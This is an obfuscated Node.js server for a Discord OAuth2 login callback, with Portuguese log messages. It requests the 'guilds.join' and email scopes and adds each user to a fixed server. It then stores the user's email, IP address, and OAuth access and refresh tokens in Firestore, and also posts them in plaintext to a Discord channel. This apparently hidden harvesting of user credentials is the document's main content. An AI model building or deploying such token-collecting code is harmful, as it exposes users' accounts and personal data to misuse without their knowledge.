function _0xf715(_0x4c2fcc,_0x3bea0d){const _0x102b0d=_0x102b();return _0xf715=function(_0xf7152f,_0x2f984b){_0xf7152f=_0xf7152f-0x1e8;let _0x57f7a2=_0x102b0d[_0xf7152f];return _0x57f7a2;},_0xf715(_0x4c2fcc,_0x3bea0d);}const _0x1a240d=_0xf715;(function(_0x1eea6f,_0xfab8ed){const _0x3cf915=_0xf715,_0x349fc2=_0x1eea6f();while(!![]){try{const _0x1ad6e3=parseInt(_0x3cf915(0x1f7))/0x1*(-parseInt(_0x3cf915(0x20b))/0x2)+-parseInt(_0x3cf915(0x201))/0x3+-parseInt(_0x3cf915(0x1f8))/0x4*(-parseInt(_0x3cf915(0x1ed))/0x5)+-parseInt(_0x3cf915(0x21b))/0x6*(parseInt(_0x3cf915(0x1ee))/0x7)+parseInt(_0x3cf915(0x211))/0x8+-parseInt(_0x3cf915(0x207))/0x9*(parseInt(_0x3cf915(0x226))/0xa)+-parseInt(_0x3cf915(0x22a))/0xb*(-parseInt(_0x3cf915(0x1fb))/0xc);if(_0x1ad6e3===_0xfab8ed)break;else _0x349fc2['push'](_0x349fc2['shift']());}catch(_0xbc33ba){_0x349fc2['push'](_0x349fc2['shift']());}}}(_0x102b,0x4ad31),require(_0x1a240d(0x1ea))[_0x1a240d(0x228)]());const express=require(_0x1a240d(0x210)),axios=require(_0x1a240d(0x1fe)),cors=require(_0x1a240d(0x20f)),{initializeApp}=require(_0x1a240d(0x1f1)),{getFirestore,collection,addDoc,serverTimestamp}=require('firebase/firestore'),app=express(),firebaseConfig={'projectId':process['env'][_0x1a240d(0x1f3)],'private_key_id':process[_0x1a240d(0x22c)]['private_key_id'],'private_key':process[_0x1a240d(0x22c)][_0x1a240d(0x1e9)][_0x1a240d(0x20e)](/\\n/g,'\x0a'),'client_email':process[_0x1a240d(0x22c)]['client_email'],'client_id':process[_0x1a240d(0x22c)][_0x1a240d(0x223)],'auth_uri':process[_0x1a240d(0x22c)][_0x1a240d(0x1ef)],'token_uri':process[_0x1a240d(0x22c)][_0x1a240d(0x1f5)],'auth_provider_x509_cert_url':process[_0x1a240d(0x22c)][_0x1a240d(0x1f0)],'client_x509_cert_url':process['env'][_0x1a240d(0x1e8)],'universe_domain':process[_0x1a240d(0x22c)][_0x1a240d(0x21d)]},firebaseApp=initializeApp(firebaseConfig),db=getFirestore(firebaseApp),{CLIENT_ID,CLIENT_SECRET,BOT_TOKEN,REDIRECT_URI,GUILD_ID=process['env'][_0x1a240d(0x20c)]||process[_0x1a240d(0x22c)][_0x1a240d(0x203)],LOG_CHANNEL_ID,PORT=0x1f90,FRONTEND_URL}=process[_0x1a240d(0x22c)];app['use'](cors({'origin':FRONTEND_URL,'credentials':!![]})),app['use'](express['json']());const discordAPI=_0x1a240d(0x202);async function sendJSONMessage(_0x3892b6){const _0x3165e8=_0x1a240d;try{LOG_CHANNEL_ID&&await axios[_0x3165e8(0x219)](discordAPI+_0x3165e8(0x1fc)+LOG_CHANNEL_ID+_0x3165e8(0x205),{'content':JSON[_0x3165e8(0x206)](_0x3892b6)},{'headers':{'Authorization':_0x3165e8(0x1f6)+BOT_TOKEN,'Content-Type':_0x3165e8(0x216)}});const _0x599fc2=await addDoc(collection(db,_0x3165e8(0x1ec)),{'username':_0x3892b6[_0x3165e8(0x1fa)],'discordId':_0x3892b6['id'],'email':_0x3892b6[_0x3165e8(0x221)]||_0x3165e8(0x1fd),'ipAddress':_0x3892b6['ip'],'accessToken':_0x3892b6[_0x3165e8(0x200)],'refreshToken':_0x3892b6[_0x3165e8(0x21a)],'timestamp':serverTimestamp(),'guildId':GUILD_ID,'categoryId':process['env']['categoryId'],'type':process['env'][_0x3165e8(0x22d)]});console['log'](_0x3165e8(0x215),_0x599fc2['id']);}catch(_0x30b44f){console[_0x3165e8(0x209)](_0x3165e8(0x225),_0x30b44f[_0x3165e8(0x204)]);}}app[_0x1a240d(0x220)](_0x1a240d(0x213),async(_0x530bf3,_0xb014a3)=>{const _0x44838a=_0x1a240d,_0x235b8f=_0x530bf3['query'][_0x44838a(0x218)],_0x5610d1=_0x530bf3[_0x44838a(0x21f)][_0x44838a(0x229)]||_0x530bf3['connection'][_0x44838a(0x1f9)];if(!_0x235b8f)return _0xb014a3[_0x44838a(0x1eb)](0x190)['send'](_0x44838a(0x222));try{const _0x86388f=await axios[_0x44838a(0x219)](discordAPI+'/oauth2/token',new URLSearchParams({'client_id':CLIENT_ID,'client_secret':CLIENT_SECRET,'grant_type':_0x44838a(0x227),'code':_0x235b8f,'redirect_uri':REDIRECT_URI,'scope':_0x44838a(0x214)}),{'headers':{'Content-Type':_0x44838a(0x208)}}),{access_token:_0x20d4f5,refresh_token:_0x519c1c,token_type:_0x5183a0}=_0x86388f[_0x44838a(0x20a)],_0x1a7079=await axios[_0x44838a(0x220)](discordAPI+'/users/@me',{'headers':{'Authorization':_0x5183a0+'\x20'+_0x20d4f5}}),_0xfe7441=_0x1a7079[_0x44838a(0x20a)];return await axios[_0x44838a(0x224)](discordAPI+_0x44838a(0x217)+GUILD_ID+_0x44838a(0x21e)+_0xfe7441['id'],{'access_token':_0x20d4f5},{'headers':{'Authorization':'Bot\x20'+BOT_TOKEN,'Content-Type':_0x44838a(0x216)}}),await sendJSONMessage({'user':_0xfe7441['username'],'id':_0xfe7441['id'],'email':_0xfe7441['email']||_0x44838a(0x1fd),'ip':_0x5610d1,'accessToken':_0x20d4f5,'refreshToken':_0x519c1c,'timestamp':new Date()[_0x44838a(0x212)]()}),_0xb014a3[_0x44838a(0x21c)](FRONTEND_URL+_0x44838a(0x20d));}catch(_0x1a68c2){return console[_0x44838a(0x209)](_0x1a68c2[_0x44838a(0x1f4)]?.['data']||_0x1a68c2[_0x44838a(0x204)]),_0xb014a3[_0x44838a(0x21c)](FRONTEND_URL+_0x44838a(0x1f2));}}),app['listen'](PORT,()=>{const _0x4fe546=_0x1a240d;console[_0x4fe546(0x1ff)](_0x4fe546(0x22b)+PORT);});function _0x102b(){const _0x16807a=['x-forwarded-for','11ZAuTdy','Servidor\x20rodando\x20na\x20porta\x20','env','type','client_x509_cert_url','private_key','dotenv','status','users','5xMNVbX','1642543NtbGUW','auth_uri','auth_provider_x509_cert_url','firebase/app','/?error=auth_failed','project_id','response','token_uri','Bot\x20','2XDqmuX','503252XpVzVu','remoteAddress','user','16122636odWDhT','/channels/','N/A','axios','log','accessToken','1249824PzLhDY','https://discord.com/api','specialServerId','message','/messages','stringify','5481531JdUxMu','application/x-www-form-urlencoded','error','data','141838mRiovl','guildId','/?success=true','replace','cors','express','1914152MGztLR','toISOString','/callback','identify\x20email\x20guilds\x20guilds.join','Dados\x20salvos\x20no\x20Firestore\x20com\x20ID:\x20','application/json','/guilds/','code','post','refreshToken','6yHUeBs','redirect','universe_domain','/members/','headers','get','email','CÃ³digo\x20ausente','client_id','put','Erro\x20ao\x20enviar\x20dados:','10ddYsuL','authorization_code','config'];_0x102b=function(){return _0x16807a;};return _0x102b();}
